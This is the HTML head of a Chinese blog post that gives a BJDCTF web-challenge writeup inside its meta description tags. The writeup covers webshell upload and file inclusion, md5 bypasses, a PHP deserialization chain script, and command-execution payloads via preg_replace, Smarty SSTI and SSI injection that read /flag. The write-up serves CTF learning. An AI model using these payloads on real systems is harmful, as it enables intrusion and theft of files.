@@ -1,0 +1,1202 @@
+
+<!doctype html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<html class="theme-next pisces" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/assets/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/assets/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/assets/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="CTF,Writeup," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/assets/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="hello_world 解题思路 打开看着像一个用模板做的网站。第一步先看源码，发现只有一个可用的链接，指向文件search.php，打开返回please make sure your id，要求我检查id。 然后抓包检查，请求头没什么特别的，不过注意到search.php的返回头中有这样的内容：id: guestZ3Vlc3Q=，猜测可能需要发送类似的请求头，于是伪造admin发送。 这次返回请使用主机访问，伪造一个XFF试试。又返回you are not from https://google.com，那就再伪造Referer，于是获得了flag。 备注 作为第一道Web题，并没有很快地做出来。首先请求头也是一种和服务器交互的方式，然后看到非标准的响应头理应想到发出类似的请求。可能还是思路不够灵活，或者经验太少。 easy_upload 解题思路 是个文件上传页面，检查过滤方式，只是要求文件MIME是jpg，不过会修改文件名为xxx.jpg，上传成功将返回文件路径。 上传木马，然后注意到url的内容：index.php?action=upload.php，文件包含。包含一下我们的木马，然后读文件/flag，获得flag。 备注 一道极为基础的文件上传和包含，然而还是过了好久才在别人的提示下恍然大悟。简单来讲就是忘记了url的内容，还是基本功不够熟练。 Hidden secrets 解题思路 打开是个登录界面，不过似乎有个重定向，看到了一闪而过的flag。抓包看看，是个假flag，不过继续抓，会看到这样的响应头：password: d0970714757783e6cf17b26fb8e2298f，看着像个md5。那试试用这个密码登录，然后密码错误。再把这个md5解密一下，是112233，登录成功。 不过新跳转的页面说我还没有登录，应该是cookie的问题，查看一下发现cookie也是一个md5，那就把刚刚那个换上，就成功了，在源码中找到flag。 easy_md5 解题思路 打开就一个输入框，抓包看看，有这样的响应头：hint: select * from &apos;admin&apos; where password=md5($pass,true)，不多说了，提交ffifdyop。 在新返回的页面源码中找到这样的内容： &amp;lt;!-- $a = $GET[&apos;a&apos;]; $b = $_GET[&apos;b&apos;]; if($a != $b &amp;amp;&amp;amp; md5($a) == md5($b)){ //wow,you can really dance --&amp;gt; md5+弱类型，或者提交数组，通过，又返回了一个源码： &amp;lt;?php error_reporting(0); include &quot;flag.php&quot;; highlight_file(__FILE__); if($_POST[&apos;param1&apos;]!==$_POST[&apos;param2&apos;]&amp;amp;&amp;amp;md5($_POST[&apos;param1&apos;])===md5($_POST[&apos;param2&apos;])){ echo $flag; } md5碰撞，或者再提交数组，获得flag。 备注 这次记住了，用提交数组的方式绕过md5检验。 Mark loves cat 解题思路 源码和请求包都没啥线索，就扫个目录，发现有git源码泄漏，提取一下，index.php部分源码如下： &amp;lt;?php include &apos;flag.php&apos;; $yds = &quot;dog&quot;; $is = &quot;cat&quot;; $handsome = &apos;yds&apos;; foreach($_POST as $x =&amp;gt; $y){ $$x = $y; } foreach($_GET as $x =&amp;gt; $y){ $$x = $$y; } foreach($_GET as $x =&amp;gt; $y){ if($_GET[&apos;flag&apos;] === $x &amp;amp;&amp;amp; $x !== &apos;flag&apos;){ exit($handsome); } } if(!isset($_GET[&apos;flag&apos;]) &amp;amp;&amp;amp; !isset($_POST[&apos;flag&apos;])){ exit($yds); } if($_POST[&apos;flag&apos;] === &apos;flag&apos; || $_GET[&apos;flag&apos;] === &apos;flag&apos;){ exit($is); } echo &quot;the flag is: &quot;.$flag; 分析一下，首先要求POST或GET中必有一个名为flag的键，但是这样的话可变变量会覆盖掉真正的flag的值。但是注意到在GET的foreach中是两个可变变量进行赋值，第一个想法是提交这样的get参数：flag=flag。但是下面要求键和值不得同为flag，所以自然地引入一个临时变量，修改get参数为这样：temp=flag&amp;amp;flag=temp。不过又触发了过滤，即要求flag键的值不得为其它键名，有点难顶了。 后来突然想到可以直接将GET数组覆盖成字符串，这样就跳过了第三个foreach，使get参数为这样：temp=flag&amp;amp;flag=temp&amp;amp;_GET=foo。然而这样就引发了刚刚第一个提到的过滤。那正好利用一下POST，同时添加post参数为：_POST[flag]=bar。完事。 这序列化也太简单了吧 解题思路 &amp;lt;?php error_reporting(0); highlight_file(__FILE__); //flag in /flag class Flag{ public $file; public function __wakeup(){ $this -&amp;gt; file = &apos;woc&apos;; } public function __destruct(){ print_r(file_get_contents($this -&amp;gt; file)); } } $exp = $_GET[&apos;exp&apos;]; $new = unserialize($exp); 构造个file属性为/flag的对象，序列化后修改成员属性绕过__wakeup()就结束了。 ZJCTF，就这？ 解题思路 又直接给了源码： &amp;lt;?php error_reporting(0); $text = $_GET[&quot;text&quot;]; $file = $_GET[&quot;file&quot;]; if(strstr(file_get_contents(&apos;php://input&apos;),&apos;a&apos;)){ die(&quot;嚯，有点意思&quot;); } if(isset($text)&amp;amp;&amp;amp;(file_get_contents($text,&apos;r&apos;)===&quot;I have a dream&quot;)){ echo &quot;&amp;lt;br&amp;gt;&amp;lt;h1&amp;gt;&quot;.file_get_contents($text,&apos;r&apos;).&quot;&amp;lt;/h1&amp;gt;&amp;lt;/br&amp;gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file)){ die(&quot;Not now!&quot;); } include($file); //next.php } else{ highlight_file(__FILE__); } ?&amp;gt; 用data协议传入”I have a dream”，然后php://filter获取next.php源码： 这是一个grep_replace()命令执行漏洞，可以利用\S*=${}执行PHP函数，构造payload：\S*=${getFlag()}&amp;amp;cmd=system(&apos;cat /flag&apos;);，获得flag。 The Mystery of IP 解题思路 打开是个简单的网站，有个Flag按钮可以点，点击，新页面返回了我的IP。修改请求头，发现可以通过修改XFF的方式控制回显。 感觉可能是SSTI，提交{{7*7}}，返回了49，确实是SSTI。然后通过报错得知模板引擎是Smarty。 可以利用{if xxx()}{/if}执行PHP函数，于是构造payload：{if system(“cat /flag”)}{/if}，获得flag。 easy_serialize 解题思路 有源码如下： &amp;lt;?php header(&quot;Content-type:text/html;charset=utf-8&quot;); error_reporting(1); class Read { public function get_file($value) { $text = base64_encode(file_get_contents($value)); return $text; } } class Show { public $source; public $var; public $class1; public function __construct($name=&apos;index.php&apos;) { $this-&amp;gt;source = $name; echo $this-&amp;gt;source.&apos; Welcome&apos;.&quot;&amp;lt;br&amp;gt;&quot;; } public function __toString() { $content = $this-&amp;gt;class1-&amp;gt;get_file($this-&amp;gt;var); echo $content; return $content; } public function _show() { if(preg_match(&apos;/gopher|http|ftp|https|dict|\.\.|flag|file/i&apos;,$this-&amp;gt;source)) { die(&apos;hacker&apos;); } else { highlight_file($this-&amp;gt;source); } } public function Change() { if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&amp;gt;source)) { echo &quot;hacker&quot;; } } public function __get($key){ $function=$this-&amp;gt;$key; $this-&amp;gt;{$key}(); } } if(isset($_GET[&apos;sid&apos;])) { $sid=$_GET[&apos;sid&apos;]; $config=unserialize($_GET[&apos;config&apos;]); $config-&amp;gt;$sid; } else { $show = new Show(&apos;index.php&apos;); $show-&amp;gt;_show(); } 首先看到Read的get_file()方法可以读文件，然后继续往下看，Show的__toString()方法会调用get_file()方法。这样的话只需要使Show对象被当作字符串执行就可以了。构造一个这样的对象： &amp;lt;?php class Read { } class Show { public $source; public $var; public $class1; } $a = new Show(); $a-&amp;gt;var = &quot;flag.php&quot;; $a-&amp;gt;class1 = new Read(); $b = new Show(); $b-&amp;gt;source = $a; echo serialize($b); ?&amp;gt; 然后放到config，sid=Change，__get()方法会将它作为方法执行，然后base64解码得到flag。另外扫目录可以看到又flag.php文件。 easy_search 解题思路 没有思路，那就扫目录，有vim源码泄漏： &amp;lt;?php ob_start(); function get_hash(){ $chars = &apos;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;amp;*()+-&apos;; $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times $content = uniqid().$random; return sha1($content); } header(&quot;Content-Type: text/html;charset=utf-8&quot;); *** if(isset($_POST[&apos;username&apos;]) and $_POST[&apos;username&apos;] != &apos;&apos; ) { $admin = &apos;6d0bc1&apos;; if ( $admin == substr(md5($_POST[&apos;password&apos;]),0,6)) { echo &quot;&amp;lt;script&amp;gt;alert(&apos;[+] Welcome to manage system&apos;)&amp;lt;/script&amp;gt;&quot;; $file_shtml = &quot;public/&quot;.get_hash().&quot;.shtml&quot;; $shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;); $text = &apos; *** *** &amp;lt;h1&amp;gt;Hello,&apos;.$_POST[&apos;username&apos;].&apos;&amp;lt;/h1&amp;gt; *** ***&apos;; fwrite($shtml,$text); fclose($shtml); *** echo &quot;[!] Header error ...&quot;; } else { echo &quot;&amp;lt;script&amp;gt;alert(&apos;[!] Failed&apos;)&amp;lt;/script&amp;gt;&quot;; }else { *** } *** ?&amp;gt; 第一个对md5的检验，好像只能爆破，好在明文数字不是很大。然后会保存到shtml文件中，可能是个SSI注入，就是不清楚怎么获得文件路径，难道是爆破？ 然后实际操作一下，说我的请求头错了，意识到响应头可能有信息。抓包看看，果然，是文件路径。然后访问stml文件，试试SSI注入，发现没什么过滤，直接用&amp;lt;!--exec cmd=&quot;&quot;&amp;gt;执行命令，获得flag。">
+<meta name="keywords" content="CTF, Writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BJDCTF Web Writeup">
+<meta property="og:url" content="http://localhost:4000/writeups/2020/01/17/BJDCTF-Web/">
+<meta property="og:site_name" content="Glyuan's Blog">
+<meta property="og:description" content="hello_world 解题思路 打开看着像一个用模板做的网站。第一步先看源码，发现只有一个可用的链接，指向文件search.php，打开返回please make sure your id，要求我检查id。 然后抓包检查，请求头没什么特别的，不过注意到search.php的返回头中有这样的内容：id: guestZ3Vlc3Q=，猜测可能需要发送类似的请求头，于是伪造admin发送。 这次返回请使用主机访问，伪造一个XFF试试。又返回you are not from https://google.com，那就再伪造Referer，于是获得了flag。 备注 作为第一道Web题，并没有很快地做出来。首先请求头也是一种和服务器交互的方式，然后看到非标准的响应头理应想到发出类似的请求。可能还是思路不够灵活，或者经验太少。 easy_upload 解题思路 是个文件上传页面，检查过滤方式，只是要求文件MIME是jpg，不过会修改文件名为xxx.jpg，上传成功将返回文件路径。 上传木马，然后注意到url的内容：index.php?action=upload.php，文件包含。包含一下我们的木马，然后读文件/flag，获得flag。 备注 一道极为基础的文件上传和包含，然而还是过了好久才在别人的提示下恍然大悟。简单来讲就是忘记了url的内容，还是基本功不够熟练。 Hidden secrets 解题思路 打开是个登录界面，不过似乎有个重定向，看到了一闪而过的flag。抓包看看，是个假flag，不过继续抓，会看到这样的响应头：password: d0970714757783e6cf17b26fb8e2298f，看着像个md5。那试试用这个密码登录，然后密码错误。再把这个md5解密一下，是112233，登录成功。 不过新跳转的页面说我还没有登录，应该是cookie的问题，查看一下发现cookie也是一个md5，那就把刚刚那个换上，就成功了，在源码中找到flag。 easy_md5 解题思路 打开就一个输入框，抓包看看，有这样的响应头：hint: select * from &apos;admin&apos; where password=md5($pass,true)，不多说了，提交ffifdyop。 在新返回的页面源码中找到这样的内容： &amp;lt;!-- $a = $GET[&apos;a&apos;]; $b = $_GET[&apos;b&apos;]; if($a != $b &amp;amp;&amp;amp; md5($a) == md5($b)){ //wow,you can really dance --&amp;gt; md5+弱类型，或者提交数组，通过，又返回了一个源码： &amp;lt;?php error_reporting(0); include &quot;flag.php&quot;; highlight_file(__FILE__); if($_POST[&apos;param1&apos;]!==$_POST[&apos;param2&apos;]&amp;amp;&amp;amp;md5($_POST[&apos;param1&apos;])===md5($_POST[&apos;param2&apos;])){ echo $flag; } md5碰撞，或者再提交数组，获得flag。 备注 这次记住了，用提交数组的方式绕过md5检验。 Mark loves cat 解题思路 源码和请求包都没啥线索，就扫个目录，发现有git源码泄漏，提取一下，index.php部分源码如下： &amp;lt;?php include &apos;flag.php&apos;; $yds = &quot;dog&quot;; $is = &quot;cat&quot;; $handsome = &apos;yds&apos;; foreach($_POST as $x =&amp;gt; $y){ $$x = $y; } foreach($_GET as $x =&amp;gt; $y){ $$x = $$y; } foreach($_GET as $x =&amp;gt; $y){ if($_GET[&apos;flag&apos;] === $x &amp;amp;&amp;amp; $x !== &apos;flag&apos;){ exit($handsome); } } if(!isset($_GET[&apos;flag&apos;]) &amp;amp;&amp;amp; !isset($_POST[&apos;flag&apos;])){ exit($yds); } if($_POST[&apos;flag&apos;] === &apos;flag&apos; || $_GET[&apos;flag&apos;] === &apos;flag&apos;){ exit($is); } echo &quot;the flag is: &quot;.$flag; 分析一下，首先要求POST或GET中必有一个名为flag的键，但是这样的话可变变量会覆盖掉真正的flag的值。但是注意到在GET的foreach中是两个可变变量进行赋值，第一个想法是提交这样的get参数：flag=flag。但是下面要求键和值不得同为flag，所以自然地引入一个临时变量，修改get参数为这样：temp=flag&amp;amp;flag=temp。不过又触发了过滤，即要求flag键的值不得为其它键名，有点难顶了。 后来突然想到可以直接将GET数组覆盖成字符串，这样就跳过了第三个foreach，使get参数为这样：temp=flag&amp;amp;flag=temp&amp;amp;_GET=foo。然而这样就引发了刚刚第一个提到的过滤。那正好利用一下POST，同时添加post参数为：_POST[flag]=bar。完事。 这序列化也太简单了吧 解题思路 &amp;lt;?php error_reporting(0); highlight_file(__FILE__); //flag in /flag class Flag{ public $file; public function __wakeup(){ $this -&amp;gt; file = &apos;woc&apos;; } public function __destruct(){ print_r(file_get_contents($this -&amp;gt; file)); } } $exp = $_GET[&apos;exp&apos;]; $new = unserialize($exp); 构造个file属性为/flag的对象，序列化后修改成员属性绕过__wakeup()就结束了。 ZJCTF，就这？ 解题思路 又直接给了源码： &amp;lt;?php error_reporting(0); $text = $_GET[&quot;text&quot;]; $file = $_GET[&quot;file&quot;]; if(strstr(file_get_contents(&apos;php://input&apos;),&apos;a&apos;)){ die(&quot;嚯，有点意思&quot;); } if(isset($text)&amp;amp;&amp;amp;(file_get_contents($text,&apos;r&apos;)===&quot;I have a dream&quot;)){ echo &quot;&amp;lt;br&amp;gt;&amp;lt;h1&amp;gt;&quot;.file_get_contents($text,&apos;r&apos;).&quot;&amp;lt;/h1&amp;gt;&amp;lt;/br&amp;gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file)){ die(&quot;Not now!&quot;); } include($file); //next.php } else{ highlight_file(__FILE__); } ?&amp;gt; 用data协议传入”I have a dream”，然后php://filter获取next.php源码： 这是一个grep_replace()命令执行漏洞，可以利用\S*=${}执行PHP函数，构造payload：\S*=${getFlag()}&amp;amp;cmd=system(&apos;cat /flag&apos;);，获得flag。 The Mystery of IP 解题思路 打开是个简单的网站，有个Flag按钮可以点，点击，新页面返回了我的IP。修改请求头，发现可以通过修改XFF的方式控制回显。 感觉可能是SSTI，提交{{7*7}}，返回了49，确实是SSTI。然后通过报错得知模板引擎是Smarty。 可以利用{if xxx()}{/if}执行PHP函数，于是构造payload：{if system(“cat /flag”)}{/if}，获得flag。 easy_serialize 解题思路 有源码如下： &amp;lt;?php header(&quot;Content-type:text/html;charset=utf-8&quot;); error_reporting(1); class Read { public function get_file($value) { $text = base64_encode(file_get_contents($value)); return $text; } } class Show { public $source; public $var; public $class1; public function __construct($name=&apos;index.php&apos;) { $this-&amp;gt;source = $name; echo $this-&amp;gt;source.&apos; Welcome&apos;.&quot;&amp;lt;br&amp;gt;&quot;; } public function __toString() { $content = $this-&amp;gt;class1-&amp;gt;get_file($this-&amp;gt;var); echo $content; return $content; } public function _show() { if(preg_match(&apos;/gopher|http|ftp|https|dict|\.\.|flag|file/i&apos;,$this-&amp;gt;source)) { die(&apos;hacker&apos;); } else { highlight_file($this-&amp;gt;source); } } public function Change() { if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&amp;gt;source)) { echo &quot;hacker&quot;; } } public function __get($key){ $function=$this-&amp;gt;$key; $this-&amp;gt;{$key}(); } } if(isset($_GET[&apos;sid&apos;])) { $sid=$_GET[&apos;sid&apos;]; $config=unserialize($_GET[&apos;config&apos;]); $config-&amp;gt;$sid; } else { $show = new Show(&apos;index.php&apos;); $show-&amp;gt;_show(); } 首先看到Read的get_file()方法可以读文件，然后继续往下看，Show的__toString()方法会调用get_file()方法。这样的话只需要使Show对象被当作字符串执行就可以了。构造一个这样的对象： &amp;lt;?php class Read { } class Show { public $source; public $var; public $class1; } $a = new Show(); $a-&amp;gt;var = &quot;flag.php&quot;; $a-&amp;gt;class1 = new Read(); $b = new Show(); $b-&amp;gt;source = $a; echo serialize($b); ?&amp;gt; 然后放到config，sid=Change，__get()方法会将它作为方法执行，然后base64解码得到flag。另外扫目录可以看到又flag.php文件。 easy_search 解题思路 没有思路，那就扫目录，有vim源码泄漏： &amp;lt;?php ob_start(); function get_hash(){ $chars = &apos;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;amp;*()+-&apos;; $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times $content = uniqid().$random; return sha1($content); } header(&quot;Content-Type: text/html;charset=utf-8&quot;); *** if(isset($_POST[&apos;username&apos;]) and $_POST[&apos;username&apos;] != &apos;&apos; ) { $admin = &apos;6d0bc1&apos;; if ( $admin == substr(md5($_POST[&apos;password&apos;]),0,6)) { echo &quot;&amp;lt;script&amp;gt;alert(&apos;[+] Welcome to manage system&apos;)&amp;lt;/script&amp;gt;&quot;; $file_shtml = &quot;public/&quot;.get_hash().&quot;.shtml&quot;; $shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;); $text = &apos; *** *** &amp;lt;h1&amp;gt;Hello,&apos;.$_POST[&apos;username&apos;].&apos;&amp;lt;/h1&amp;gt; *** ***&apos;; fwrite($shtml,$text); fclose($shtml); *** echo &quot;[!] Header error ...&quot;; } else { echo &quot;&amp;lt;script&amp;gt;alert(&apos;[!] Failed&apos;)&amp;lt;/script&amp;gt;&quot;; }else { *** } *** ?&amp;gt; 第一个对md5的检验，好像只能爆破，好在明文数字不是很大。然后会保存到shtml文件中，可能是个SSI注入，就是不清楚怎么获得文件路径，难道是爆破？ 然后实际操作一下，说我的请求头错了，意识到响应头可能有信息。抓包看看，果然，是文件路径。然后访问stml文件，试试SSI注入，发现没什么过滤，直接用&amp;lt;!--exec cmd=&quot;&quot;&amp;gt;执行命令，获得flag。">
+<meta property="og:locale" content="zh-Hans">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="BJDCTF Web Writeup">
+<meta name="twitter:description" content="hello_world 解题思路 打开看着像一个用模板做的网站。第一步先看源码，发现只有一个可用的链接，指向文件search.php，打开返回please make sure your id，要求我检查id。 然后抓包检查，请求头没什么特别的，不过注意到search.php的返回头中有这样的内容：id: guestZ3Vlc3Q=，猜测可能需要发送类似的请求头，于是伪造admin发送。 这次返回请使用主机访问，伪造一个XFF试试。又返回you are not from https://google.com，那就再伪造Referer，于是获得了flag。 备注 作为第一道Web题，并没有很快地做出来。首先请求头也是一种和服务器交互的方式，然后看到非标准的响应头理应想到发出类似的请求。可能还是思路不够灵活，或者经验太少。 easy_upload 解题思路 是个文件上传页面，检查过滤方式，只是要求文件MIME是jpg，不过会修改文件名为xxx.jpg，上传成功将返回文件路径。 上传木马，然后注意到url的内容：index.php?action=upload.php，文件包含。包含一下我们的木马，然后读文件/flag，获得flag。 备注 一道极为基础的文件上传和包含，然而还是过了好久才在别人的提示下恍然大悟。简单来讲就是忘记了url的内容，还是基本功不够熟练。 Hidden secrets 解题思路 打开是个登录界面，不过似乎有个重定向，看到了一闪而过的flag。抓包看看，是个假flag，不过继续抓，会看到这样的响应头：password: d0970714757783e6cf17b26fb8e2298f，看着像个md5。那试试用这个密码登录，然后密码错误。再把这个md5解密一下，是112233，登录成功。 不过新跳转的页面说我还没有登录，应该是cookie的问题，查看一下发现cookie也是一个md5，那就把刚刚那个换上，就成功了，在源码中找到flag。 easy_md5 解题思路 打开就一个输入框，抓包看看，有这样的响应头：hint: select * from &apos;admin&apos; where password=md5($pass,true)，不多说了，提交ffifdyop。 在新返回的页面源码中找到这样的内容： &amp;lt;!-- $a = $GET[&apos;a&apos;]; $b = $_GET[&apos;b&apos;]; if($a != $b &amp;amp;&amp;amp; md5($a) == md5($b)){ //wow,you can really dance --&amp;gt; md5+弱类型，或者提交数组，通过，又返回了一个源码： &amp;lt;?php error_reporting(0); include &quot;flag.php&quot;; highlight_file(__FILE__); if($_POST[&apos;param1&apos;]!==$_POST[&apos;param2&apos;]&amp;amp;&amp;amp;md5($_POST[&apos;param1&apos;])===md5($_POST[&apos;param2&apos;])){ echo $flag; } md5碰撞，或者再提交数组，获得flag。 备注 这次记住了，用提交数组的方式绕过md5检验。 Mark loves cat 解题思路 源码和请求包都没啥线索，就扫个目录，发现有git源码泄漏，提取一下，index.php部分源码如下： &amp;lt;?php include &apos;flag.php&apos;; $yds = &quot;dog&quot;; $is = &quot;cat&quot;; $handsome = &apos;yds&apos;; foreach($_POST as $x =&amp;gt; $y){ $$x = $y; } foreach($_GET as $x =&amp;gt; $y){ $$x = $$y; } foreach($_GET as $x =&amp;gt; $y){ if($_GET[&apos;flag&apos;] === $x &amp;amp;&amp;amp; $x !== &apos;flag&apos;){ exit($handsome); } } if(!isset($_GET[&apos;flag&apos;]) &amp;amp;&amp;amp; !isset($_POST[&apos;flag&apos;])){ exit($yds); } if($_POST[&apos;flag&apos;] === &apos;flag&apos; || $_GET[&apos;flag&apos;] === &apos;flag&apos;){ exit($is); } echo &quot;the flag is: &quot;.$flag; 分析一下，首先要求POST或GET中必有一个名为flag的键，但是这样的话可变变量会覆盖掉真正的flag的值。但是注意到在GET的foreach中是两个可变变量进行赋值，第一个想法是提交这样的get参数：flag=flag。但是下面要求键和值不得同为flag，所以自然地引入一个临时变量，修改get参数为这样：temp=flag&amp;amp;flag=temp。不过又触发了过滤，即要求flag键的值不得为其它键名，有点难顶了。 后来突然想到可以直接将GET数组覆盖成字符串，这样就跳过了第三个foreach，使get参数为这样：temp=flag&amp;amp;flag=temp&amp;amp;_GET=foo。然而这样就引发了刚刚第一个提到的过滤。那正好利用一下POST，同时添加post参数为：_POST[flag]=bar。完事。 这序列化也太简单了吧 解题思路 &amp;lt;?php error_reporting(0); highlight_file(__FILE__); //flag in /flag class Flag{ public $file; public function __wakeup(){ $this -&amp;gt; file = &apos;woc&apos;; } public function __destruct(){ print_r(file_get_contents($this -&amp;gt; file)); } } $exp = $_GET[&apos;exp&apos;]; $new = unserialize($exp); 构造个file属性为/flag的对象，序列化后修改成员属性绕过__wakeup()就结束了。 ZJCTF，就这？ 解题思路 又直接给了源码： &amp;lt;?php error_reporting(0); $text = $_GET[&quot;text&quot;]; $file = $_GET[&quot;file&quot;]; if(strstr(file_get_contents(&apos;php://input&apos;),&apos;a&apos;)){ die(&quot;嚯，有点意思&quot;); } if(isset($text)&amp;amp;&amp;amp;(file_get_contents($text,&apos;r&apos;)===&quot;I have a dream&quot;)){ echo &quot;&amp;lt;br&amp;gt;&amp;lt;h1&amp;gt;&quot;.file_get_contents($text,&apos;r&apos;).&quot;&amp;lt;/h1&amp;gt;&amp;lt;/br&amp;gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file)){ die(&quot;Not now!&quot;); } include($file); //next.php } else{ highlight_file(__FILE__); } ?&amp;gt; 用data协议传入”I have a dream”，然后php://filter获取next.php源码： 这是一个grep_replace()命令执行漏洞，可以利用\S*=${}执行PHP函数，构造payload：\S*=${getFlag()}&amp;amp;cmd=system(&apos;cat /flag&apos;);，获得flag。 The Mystery of IP 解题思路 打开是个简单的网站，有个Flag按钮可以点，点击，新页面返回了我的IP。修改请求头，发现可以通过修改XFF的方式控制回显。 感觉可能是SSTI，提交{{7*7}}，返回了49，确实是SSTI。然后通过报错得知模板引擎是Smarty。 可以利用{if xxx()}{/if}执行PHP函数，于是构造payload：{if system(“cat /flag”)}{/if}，获得flag。 easy_serialize 解题思路 有源码如下： &amp;lt;?php header(&quot;Content-type:text/html;charset=utf-8&quot;); error_reporting(1); class Read { public function get_file($value) { $text = base64_encode(file_get_contents($value)); return $text; } } class Show { public $source; public $var; public $class1; public function __construct($name=&apos;index.php&apos;) { $this-&amp;gt;source = $name; echo $this-&amp;gt;source.&apos; Welcome&apos;.&quot;&amp;lt;br&amp;gt;&quot;; } public function __toString() { $content = $this-&amp;gt;class1-&amp;gt;get_file($this-&amp;gt;var); echo $content; return $content; } public function _show() { if(preg_match(&apos;/gopher|http|ftp|https|dict|\.\.|flag|file/i&apos;,$this-&amp;gt;source)) { die(&apos;hacker&apos;); } else { highlight_file($this-&amp;gt;source); } } public function Change() { if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&amp;gt;source)) { echo &quot;hacker&quot;; } } public function __get($key){ $function=$this-&amp;gt;$key; $this-&amp;gt;{$key}(); } } if(isset($_GET[&apos;sid&apos;])) { $sid=$_GET[&apos;sid&apos;]; $config=unserialize($_GET[&apos;config&apos;]); $config-&amp;gt;$sid; } else { $show = new Show(&apos;index.php&apos;); $show-&amp;gt;_show(); } 首先看到Read的get_file()方法可以读文件，然后继续往下看，Show的__toString()方法会调用get_file()方法。这样的话只需要使Show对象被当作字符串执行就可以了。构造一个这样的对象： &amp;lt;?php class Read { } class Show { public $source; public $var; public $class1; } $a = new Show(); $a-&amp;gt;var = &quot;flag.php&quot;; $a-&amp;gt;class1 = new Read(); $b = new Show(); $b-&amp;gt;source = $a; echo serialize($b); ?&amp;gt; 然后放到config，sid=Change，__get()方法会将它作为方法执行，然后base64解码得到flag。另外扫目录可以看到又flag.php文件。 easy_search 解题思路 没有思路，那就扫目录，有vim源码泄漏： &amp;lt;?php ob_start(); function get_hash(){ $chars = &apos;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;amp;*()+-&apos;; $random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times $content = uniqid().$random; return sha1($content); } header(&quot;Content-Type: text/html;charset=utf-8&quot;); *** if(isset($_POST[&apos;username&apos;]) and $_POST[&apos;username&apos;] != &apos;&apos; ) { $admin = &apos;6d0bc1&apos;; if ( $admin == substr(md5($_POST[&apos;password&apos;]),0,6)) { echo &quot;&amp;lt;script&amp;gt;alert(&apos;[+] Welcome to manage system&apos;)&amp;lt;/script&amp;gt;&quot;; $file_shtml = &quot;public/&quot;.get_hash().&quot;.shtml&quot;; $shtml = fopen($file_shtml, &quot;w&quot;) or die(&quot;Unable to open file!&quot;); $text = &apos; *** *** &amp;lt;h1&amp;gt;Hello,&apos;.$_POST[&apos;username&apos;].&apos;&amp;lt;/h1&amp;gt; *** ***&apos;; fwrite($shtml,$text); fclose($shtml); *** echo &quot;[!] Header error ...&quot;; } else { echo &quot;&amp;lt;script&amp;gt;alert(&apos;[!] Failed&apos;)&amp;lt;/script&amp;gt;&quot;; }else { *** } *** ?&amp;gt; 第一个对md5的检验，好像只能爆破，好在明文数字不是很大。然后会保存到shtml文件中，可能是个SSI注入，就是不清楚怎么获得文件路径，难道是爆破？ 然后实际操作一下，说我的请求头错了，意识到响应头可能有信息。抓包看看，果然，是文件路径。然后访问stml文件，试试SSI注入，发现没什么过滤，直接用&amp;lt;!--exec cmd=&quot;&quot;&amp;gt;执行命令，获得flag。">
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    sidebar: {"position":"left","display":"always","offset":12,"offset_float":0,"b2t":true,"scrollpercent":true},
+    fancybox: true,
+    motion: false,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://localhost:4000/"/>
+
+
+
+
+
+  <title>BJDCTF Web Writeup | Glyuan's Blog</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"> <div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
